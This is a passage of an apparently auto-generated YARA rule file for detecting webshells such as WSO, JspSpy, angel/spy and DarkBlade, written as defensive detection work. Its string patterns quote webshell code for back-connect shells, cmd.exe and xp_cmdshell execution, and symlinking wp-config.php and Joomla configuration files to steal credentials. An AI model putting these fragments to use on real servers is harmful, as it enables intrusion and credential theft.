      hash1 = "c8df75173ff2c9fae9980b311fbf23740b47481aec2175218d7ea99db5c31770"
      hash2 = "0863907cbabc1679e00a99f84c5adc3ff4daab11aa0df970e37f051c770d31ed"
   strings:
      $s1 = "$port[4000] = \"icq, command-n-conquer and shell nfm\";" fullword ascii
      $s2 = "$port[49] = \"TACACS, Login Host Protocol\";" fullword ascii
      $s3 = "$port[513] = \"who, rlogin\";" fullword ascii
      $s4 = "$port[543] = \"KLogin, AppleShare over IP\";" fullword ascii
      $s5 = "$port[3] = \"Compression Process\";" fullword ascii
      $s6 = "$port[23456] = \"EvilFTP\";" fullword ascii
      $s7 = "$port[2301] = \"Compaq Insight Management Web Agents\";" fullword ascii
      $s8 = "$port[45] = \"Message Processing Module [recv]\";" fullword ascii
      $s9 = "$port[512] = \"biff, rexec\";" fullword ascii
      $s10 = "$port[27] = \"ETRN (NSW User System FE)\";" fullword ascii
      $s11 = "$port[514] = \"syslog, rsh\";" fullword ascii
      $s12 = "$port[104] = \"ACR-NEMA Digital Imag. & Comm. 300\";" fullword ascii
      $s13 = "$port[115] = \"sftp (Simple File Transfer Protocol)\";" fullword ascii
      $s14 = "$port[45000] = \"Cisco NetRanger postofficed\";" fullword ascii
      $s15 = "$port[5555] = \"Personal Agent\";" fullword ascii
      $s16 = "$port[20] = \"ftp-data\";" fullword ascii
      $s17 = "$port[6667] = \"IRC\";" fullword ascii
      $s18 = "$port[3031] = \"Apple AgentVU\";" fullword ascii
      $s19 = "$port[81] = \"HOSTS2 Name Serve\";" fullword ascii
      $s20 = "$port[705] = \"AgentX for SNMP\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _aspxwebsniff1_0_linux_sniffer__aspx_36 {
   meta:
      description = "webshell - from files aspxwebsniff1.0-linux.aspx, sniffer--aspx.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ac297be1bc6d2147d5220775da20bd422f8453abb3e288eea12f40a62e4f3343"
      hash2 = "883986581a7f0a3dd4b2af35aa880957e9dee92019fc7e3a046328a99682ed56"
   strings:
      $s1 = "            logfile = Server.MapPath(\"w\" + System.DateTime.Now.ToFileTime() + \".txt\");" fullword ascii
      $s2 = "        if (stoptime.Year == (System.DateTime.Now.Year - 8))" fullword ascii
      $s3 = "                if (!logIt && my_s_http_post)" fullword ascii
      $s4 = "                if (!logIt && my_s_smtp && (dport == 25 || sport == 25))" fullword ascii
      $s5 = "                <asp:TextBox ID=\"txtlogfile\" runat=\"server\"   width=\"90%\" Text=\"log.log\" ></asp:TextBox>" fullword ascii
      $s6 = "<%@ Import Namespace=\"System.Net.NetworkInformation\" %>" fullword ascii
      $s7 = "        proException += \"<br>last time stop at \" + System.DateTime.Now.ToString();" fullword ascii
      $s8 = "            this.Lb_msg.Text = System.DateTime.Now.ToString() + \"  State: <b>stoping. Click \\\"Refresh\\\" again to see if thr" ascii
      $s9 = "            this.Lb_msg.Text = System.DateTime.Now.ToString()+\"  State: <b>\" + th.ThreadState.ToString() +\"</b>  Packets: \"+" ascii
      $s10 = "            this.Lb_msg.Text = System.DateTime.Now.ToString() + \"  State: <b>stoping. Click \\\"Refresh\\\" again to see if thr" ascii
      $s11 = "            this.Lb_msg.Text = System.DateTime.Now.ToString()+\"  State: <b>\" + th.ThreadState.ToString() +\"</b>  Packets: \"+" ascii
      $s12 = "                    if (!logIt && datas.IndexOf(\"POST \")>=0)" fullword ascii
      $s13 = "        if (this.txtlogfile.Text == \"\" || txtpackets.Text.Length < 1 || txtport.Text == \"\") return;" fullword ascii
      $s14 = "                if (!logIt && (dport == port || sport == port))" fullword ascii
      $s15 = "              <asp:CheckBox ID=\"s_http_post\" runat=\"server\" />" fullword ascii
      $s16 = "            IPHostEntry HosyEntry = Dns.GetHostEntry((Dns.GetHostName()));" fullword ascii
      $s17 = "        //stoptime = System.DateTime.Now;" fullword ascii
      $s18 = "            System.DateTime nextDay = System.DateTime.Now.AddDays(1);" fullword ascii
      $s19 = "<div id=\"tt\">  <b> WebSniff 1.0</b><br /><br />  </div>" fullword ascii
      $s20 = "    static DateTime stoptime = System.DateTime.Now.AddYears(-8);" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 60KB and ( 8 of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014_2014_4_0__1___2013__2012____1__37 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, 2014.asp, 4.0 (1).asp, .asp, 2013.asp, _2012.asp, .asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash5 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash6 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash7 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash8 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash9 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash10 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $x1 = "B.Connection\"):adoConn.Open \"Provider=SQLOLEDB.1;Password=\"&password&\";User ID=\"&id:strQuery = \"exec master.dbo.xp_cMdsHeL" ascii
      $s2 = " request.form(\"MMD\") & \"'\":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF Then:Do While NOT recResult.EOF:st" ascii
      $s3 = "<INPUT type=text name=Folder value=\"\"c:\\php\\,d:\\Program Files\\,C:\\Documents and Settings\\All Users\\Documents\\,C:\\recy" ascii
      $s4 = "<INPUT type=text name=Folder value=\"\"c:\\php\\,d:\\Program Files\\,C:\\Documents and Settings\\All Users\\Documents\\,C:\\recy" ascii
      $s5 = "case \"getTerminalInfo\":getTerminalInfo():case \"PageAddToMdb\":PageAddToMdb():case \"ScanPort\":ScanPort():FuncTion MMD():SI=" ascii
      $s6 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If tri" ascii
      $s7 = "j\" method=Post><TD align=middle><B>System32" fullword ascii
      $s8 = " <TD align=middle><a href=\"&URL&\"?Action=ScFolder&Folder=c:\\recycler\\><b>" fullword ascii
      $s9 = "equest.form(\"MMD\"))<>\"\"  Then:password= trim(Request.form(\"P\")):id=trim(Request.form(\"U\")):set adoConn=sERvEr.crEATeobjE" ascii
      $s10 = "orm name=form method=post action=\"\"\"\"><table width=\"\"85%\"\" align='center'><tr align=center><Td id=s><b id=x>MSSQL Comman" ascii
      $s11 = "case \"getTerminalInfo\":getTerminalInfo():case \"PageAddToMdb\":PageAddToMdb():case \"ScanPort\":ScanPort():FuncTion MMD():SI=" ascii
      $s12 = "j\"</form><script>function RUNonclick(){document.xform.china.name = parent.pwd.value;document.xform.action = parent.url.value;do" ascii
      $s13 = "cycler\\,e:\\recycler\\,f:\\recycler\\,C:\\wmpub\\,C:\\WINDOWS\\Temp\\,C:\\360rec,C:\\cache,C:\\JPEGCapture,C:\\Inetpub\"\"><INP" ascii
      $s14 = "j\"</form><script>function RUNonclick(){document.xform.china.name = parent.pwd.value;document.xform.action = parent.url.value;do" ascii
      $s15 = "form.submit();}else{top.hideform.FName.value = \"\"\"\";}}</script>\"" fullword ascii
      $s16 = "case\"Logout\":Session.Contents.Remove(\"kkk\"):Response.Redirect URL" fullword ascii
      $s17 = "fsoX.GetFile(FileUrl).Attributes=32" fullword ascii
      $s18 = "function cmd1shell()" fullword ascii
      $s19 = "dim AlexaUrl,Top:AlexaUrl=request(\"u\"):Top=Alexa(AlexaUrl):if AlexaUrl=\"\" then AlexaUrl=\"\"&request.servervariables(\"http_" ascii
      $s20 = "For k = 1 To Len(strin) - i " fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _angel_2008_spy_2011_2009mssql_38 {
   meta:
      description = "webshell - from files angel.php, 2008.php, spy.php, 2011.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash2 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash3 = "e1c70ddcfbc56c7dff46ea03ed53aab3f022e53a6f8e98f12d8b8557cc6bfb4d"
      hash4 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash5 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $s1 = "$res = execute(which('perl').\" /tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $s2 = "$res = execute(\"/tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $s3 = "' : '').($curpage > 1 ? '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.($curpage - 1).');\">Prev</a> ' : '');" fullword ascii
      $s4 = "$multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', 1);\">Firs" ascii
      $s5 = "$multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', 1);\">Firs" ascii
      $s6 = "$result = q(\"SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';\");" fullword ascii
      $s7 = "formhead(array('title'=>'Back Connect'));" fullword ascii
      $s8 = "if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {" fullword ascii
      $s9 = "if(($to - $from) < $page && ($to - $from) < $pages) {" fullword ascii
      $s10 = "p('<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');" fullword ascii
      $s11 = "if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {" fullword ascii
      $s12 = "m('Database has success backup to <a href=\"'.$fileurl.'\" target=\"_blank\">'.$path.'</a>');" fullword ascii
      $s13 = "$multipage .= ($curpage < $pages ? '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.($curpage + 1).');\">Next</a>'" ascii
      $s14 = "$multipage .= ($curpage < $pages ? '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.($curpage + 1).');\">Next</a>'" ascii
      $s15 = "!$dbuser && $dbuser = 'root';" fullword ascii
      $s16 = "$to = $curpage + 1 - $from;" fullword ascii
      $s17 = "ef=\"javascript:settable(\\''.$tablename.'\\', \\'drop\\');\">Drop</a> ]');" fullword ascii
      $s18 = "$from = $curpage - $pages + $to;" fullword ascii
      $s19 = "$from = $pages - $page + 1;" fullword ascii
      $s20 = "p(' | Current Table: <a href=\"javascript:settable(\\''.$tablename.'\\');\">'.$tablename.'</a> [ <a href=\"javascript:settable(" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _WSO_4_0_5_wso_39 {
   meta:
      description = "webshell - from files WSO_4_0_5.php, wso.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash2 = "ef740d974b11cf6c8da3d4e81785236e4f6ba1d5b0b7a89787955963bcba5f6d"
   strings:
      $s1 = " '<td><nobr>'.substr(@php_uname(), 0, 120).'  <a href=\"http://www.google.com/search?q='.urlencode(@php_uname()).'\" target=\"_b" ascii
      $s2 = "showSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s3 = "<html><head><meta http-equiv='Content-Type' content='text/html; charset=<?=$_POST['charset']?>'><title><?=$_SERVER['HTTP_HOST']?" ascii
      $s4 = "echo \"<br><textarea name='p3' style='width:100%;height:100px'>\".@htmlspecialchars($_POST['p3']).\"</textarea><br/><input type=" ascii
      $s5 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=''\";" fullword ascii
      $s6 = "FailRoot'Cod3rz <a href='http://failroot.wordpress.com/'>FailRoot-Sec.Com</a> | <a  " fullword ascii
      $s7 = "echo \"<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s8 = "<td><input type=text name=sql_login value='<?=(empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login']));?>'></td" ascii
      $s9 = "<td><input type=text name=sql_login value='<?=(empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login']));?>'></td" ascii
      $s10 = "echo \"<tr><td><a href=http://www.\".$domains[1][0].\"/>\".$domains[1][0].\"</a></td><td>\".$user['name'].\"</td><td><a href='sy" ascii
      $s11 = "req.onreadystatechange = processReqChange;" fullword ascii
      $s12 = "mit value='Execute'>\";" fullword ascii
      $s13 = "echo '</form></div><script>document.cf.cmd.focus();</script>';" fullword ascii
      $s14 = "echo \"<tr><td><a href=http://www.\".$domains[1][0].\"/>\".$domains[1][0].\"</a></td><td>\".$user['name'].\"</td><td><a href='sy" ascii
      $s15 = "showSecParam('OS version', @file_get_contents('/proc/version'));" fullword ascii
      $s16 = "href='http://wWw.sEc4EvEr.CoM/'>wWw.sEc4EvEr.CoM</a><br> " fullword ascii
      $s17 = "showSecParam('Distr name', @file_get_contents('/etc/issue.net'));" fullword ascii
      $s18 = "<html><head><meta http-equiv='Content-Type' content='text/html; charset=<?=$_POST['charset']?>'><title><?=$_SERVER['HTTP_HOST']?" ascii
      $s19 = "$out = ex(which(\"perl\").\" /tmp/bp.pl \".$_POST['p2'].\" &\");" fullword ascii
      $s20 = "$out = ex(which(\"perl\").\" /tmp/bc.pl \".$_POST['p2'].\" \".$_POST['p3'].\" &\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _c5_403_queryDong_myxx1_config_000_t00ls1_zend_t00ls_spyjsp2010_40 {
   meta:
      description = "webshell - from files c5.jsp, 403.jsp, queryDong.jsp, myxx1.jsp, config.jsp, 000.jsp, t00ls1.jsp, zend.jsp, t00ls.jsp, spyjsp2010.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
      hash2 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
      hash3 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
      hash4 = "a5b67b8b8617fd8f2cff76399aa8782813bb29f06c9b6b444db8617a65a0771c"
      hash5 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
      hash6 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
      hash7 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
      hash8 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
      hash9 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
      hash10 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
   strings:
      $s1 = "cmd = \"cmd.exe /c set\";" fullword ascii
      $s2 = "Object o = dbo.execute(sql);" fullword ascii
      $s3 = "targetIP = \"127.0.0.1\";" fullword ascii
      $s4 = "upload.setTargetOutput(stream);" fullword ascii
      $s5 = "if (Util.isEmpty(targetPort))" fullword ascii
      $s6 = "targetPort = \"3389\";" fullword ascii
      $s7 = "String targetPort = request.getParameter(\"targetPort\");" fullword ascii
      $s8 = "public SpyClassLoader() {" fullword ascii
      $s9 = "private static final String MODIFIED_ERROR = \"JspSpy Was Modified By Some Other Applications. Please Logout.\";" fullword ascii
      $s10 = "Socket targetS = new Socket();" fullword ascii
      $s11 = "if (Util.isEmpty(targetIP))" fullword ascii
      $s12 = "SpyClassLoader loader = new SpyClassLoader();" fullword ascii
      $s13 = "out = this.targetOutput;" fullword ascii
      $s14 = "String targetIP = request.getParameter(\"targetIP\");" fullword ascii
      $s15 = "private static final String BACK_HREF = \" <a href='javascript:history.back()'>Back</a>\";" fullword ascii
      $s16 = "handled.add(tmp);" fullword ascii
      $s17 = "Ddbo.getConn().setCatalog(request.getParameter(\"catalog\"));" fullword ascii
      $s18 = "String currentd = JSession.getAttribute(CURRENT_DIR).toString();" fullword ascii
      $s19 = "this.exclude = request.getParameter(\"exclude\").split(\",\");" fullword ascii
      $s20 = "Object msg = JSession.getAttribute(MSG);" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _angel_2008_2009lite_spy_2011_2009mssql_41 {
   meta:
      description = "webshell - from files angel.php, 2008.php, 2009lite.php, spy.php, 2011.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash2 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash3 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
      hash4 = "e1c70ddcfbc56c7dff46ea03ed53aab3f022e53a6f8e98f12d8b8557cc6bfb4d"
      hash5 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash6 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $x1 = "$exec = $wsh->exec('cmd.exe /c '.$command);" fullword ascii
      $x2 = "!$program && $program = 'c:\\windows\\system32\\cmd.exe';" fullword ascii
      $s3 = "formhead(array('title'=>'Execute Command'));" fullword ascii
      $s4 = "echo(execute($command));" fullword ascii
      $s5 = "!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';" fullword ascii
      $s6 = "formhead(array('title'=>'Execute Program'));" fullword ascii
      $s7 = "$a = $shell->ShellExecute($program,$parameter);" fullword ascii
      $s8 = "$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);" fullword ascii
      $s9 = "if ($execfunc=='wscript' && IS_WIN && IS_COM) {" fullword ascii
      $s10 = "} elseif ($execfunc=='proc_open' && IS_WIN && IS_COM) {" fullword ascii
      $s11 = "m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'))" ascii
      $s12 = "m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'))" ascii
      $s13 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">" fullword ascii
      $s14 = "$wsh = new COM('WScript.shell');" fullword ascii
      $s15 = "function getPath($scriptpath, $nowpath) {" fullword ascii
      $s16 = "p('<a href=\"javascript:fileperm(\\''.$dirdb['server_link'].'\\');\">'.$dirdb['dirchmod'].'</a> / ');" fullword ascii
      $s17 = "echo fgets($pipes[1], 1024);" fullword ascii
      $s18 = "echo fgets($pipes[2], 1024);" fullword ascii
      $s19 = "fwrite($pipes[0], $command.\"\\r\\n\");" fullword ascii
      $s20 = "$execfuncdb = array('phpfunc'=>'phpfunc','wscript'=>'wscript','proc_open'=>'proc_open');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _DarkBlade1_5_indexx_42 {
   meta:
      description = "webshell - from files DarkBlade1.5.asp, indexx.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1acff7ac75d73a0c7589e0403e5e7be7b4708faf278f76eb45008710a7f9a4c8"
      hash2 = "a828153a8ec75ebeec010bd9e0fa5873b9c2602c0caa393a115075a16d74d0ab"
   strings:
      $x1 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,strPath VarChar,binContent Image)\")" fullword ascii
      $x2 = "conn.execute \"CREATE TABLE [dark_temp] ([id] [int] NULL ,[binfile] [Image] NULL) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY];\"" fullword ascii
      $x3 = "conn.execute \"If object_id('dark_temp')is not null drop table dark_temp\"" fullword ascii
      $x4 = "conn.execute \"CREATE TABLE [dark_temp] ([binfile] [Image] NULL)\"" fullword ascii
      $s5 = "doTd User.LoginScript,\"\"" fullword ascii
      $s6 = "doTd\"Autologin password:\",\"\"" fullword ascii
      $s7 = "echo\"<center><b>Execute Cmd</b><br>\"" fullword ascii
      $s8 = "doTd\"Autologin account:\",\"\"" fullword ascii
      $s9 = "rs.Open \"select * from dark_temp\",conn,1,1" fullword ascii
      $s10 = "rs.Open \"SELECT * FROM dark_temp where id is null\",conn,1,3" fullword ascii
      $s11 = "doTd\"Execute Sql\",\"10%\"" fullword ascii
      $s12 = "doTd\"User loginscript\",\"\"" fullword ascii
      $s13 = "echo\" Password:\"" fullword ascii
      $s14 = "doTd\"Last login\",\"\"" fullword ascii
      $s15 = "doTd Server.ScriptTimeout,\"\"" fullword ascii
      $s16 = "doTd\"Target\",\"10%\"" fullword ascii
      $s17 = "echo\"<hr>Notice: Unpacking need FSO object,all files unpacked will be under target folder,replacing same named!\"" fullword ascii
      $s18 = "doTd\"Temp domain port\",\"\"" fullword ascii
      $s19 = "doTd ScriptEngine&\"/\"&ScriptEngineMajorVersion&\".\"&ScriptEngineMinorVersion&\".\"&ScriptEngineBuildVersion,\"\"" fullword ascii
      $s20 = "echo\" Username:\"" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1n73ction_v4xGus6X_43 {
   meta:
      description = "webshell - from files 1n73ction.php, v4xGus6X.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8dde4d18d837508fd3c62b2a4f8bf2ea9ddb4d11177331a28642518ffabfe8ed"
      hash2 = "f81558fca974375a5e6512dece2d3d3a0d854390223511c609ed61a104f9e2fa"
   strings:
      $s1 = "symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
      $s2 = "symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $s3 = "symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
      $s4 = "symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $s5 = "symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $s6 = "symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $s7 = "symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $s8 = "symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
      $s9 = "symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $s10 = "symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
      $s11 = "symlink('/home5/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
      $s12 = "symlink('/home/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
      $s13 = "symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
      $s14 = "symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $s15 = "symlink('/home2/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');" fullword ascii
      $s16 = "symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');" fullword ascii
      $s17 = "symlink('/home7/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');" fullword ascii
      $s18 = "symlink('/home6/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');" fullword ascii
      $s19 = "symlink('/home5/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');" fullword ascii
      $s20 = "symlink('/home4/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _r00ts_php_icesword_44 {
   meta:
      description = "webshell - from files r00ts php.php, icesword.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8dafcd59e326fb8b5d5a54243e4beca182eb230c45e73064ee4acbfd3d302ead"
      hash2 = "adf16adeffb5b05dda9e3588f06dba46fcd520c33f113ec0090cd4cda82b8b11"
   strings:
      $x1 = "$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';" fullword ascii
      $s2 = "if($_POST['xor'] == 'a' && isset($_POST['number'])){$Oday_value = $_POST['number'];$Shell_Code = shellcode_encode($_POST['code']" ascii
      $s3 = "if($_POST['xor'] == 'a' && isset($_POST['number'])){$Oday_value = $_POST['number'];$Shell_Code = shellcode_encode($_POST['code']" ascii
      $s4 = "if($_POST['xor'] == 'b'){$checkeda = '';$checkedb = ' checked';$Shell_Code_Array = shellcode_findxor($_POST['code']);$Shell_Code" ascii
      $s5 = "if($_POST['xor'] == 'b'){$checkeda = '';$checkedb = ' checked';$Shell_Code_Array = shellcode_findxor($_POST['code']);$Shell_Code" ascii
      $s6 = "$result = @$shell->Execute($sql);" fullword ascii
      $s7 = "$shellcode[0] = shellcode_decode($Url_String, dechex($i));" fullword ascii
      $s8 = "function shellcode_decode($Url_String,$Oday_value)" fullword ascii
      $s9 = "function shellcode_encode($Url_String,$Oday_value)" fullword ascii
      $s10 = "function shellcode_findxor($Url_String)" fullword ascii
      $s11 = "function Shellcode_j()" fullword ascii
      $s12 = "array(\"FTP\",Info_Fun(\"ftp_login\"))," fullword ascii
      $s13 = "$shell1 = new COM(\"wscript.shell\") or die(\"require windows host\");" fullword ascii
      $s14 = "if($_POST['class'] == 'ftp'){$Ftp_conn = @ftp_connect($_POST['address'],'21');$connect = @ftp_login($Ftp_conn,$_POST['user'],cho" ascii
      $s15 = "$ftphost = isset($_POST['ftphost']) ? $_POST['ftphost'] : '127.0.0.1';" fullword ascii
      $s16 = "Str[7] = \"select 0xxxxx from mysql.user into outfile 'c:\\\\\\\\inetpub\\\\\\\\wwwroot\\\\\\\\test.php'\";" fullword ascii
      $s17 = "if($_POST['class'] == 'ftp'){$Ftp_conn = @ftp_connect($_POST['address'],'21');$connect = @ftp_login($Ftp_conn,$_POST['user'],cho" ascii
      $s18 = "return $shellcode;" fullword ascii
      $s19 = "$shellcode[1] = dechex($i);" fullword ascii
      $s20 = "if((!empty($_POST['address'])) && (!empty($_POST['user'])) && (!empty($_POST['pass'])))" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso2_5_1_other_decode_wso_4_2_3_wso_4_2_1_wso2_WSO_4_0_5_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_wso_45 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso2.5.1.php, other-decode.php, wso-4.2.3.php, wso-4.2.1.php, wso2.php, WSO_4_0_5.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php, wso.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash3 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash4 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash5 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash6 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash7 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash8 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
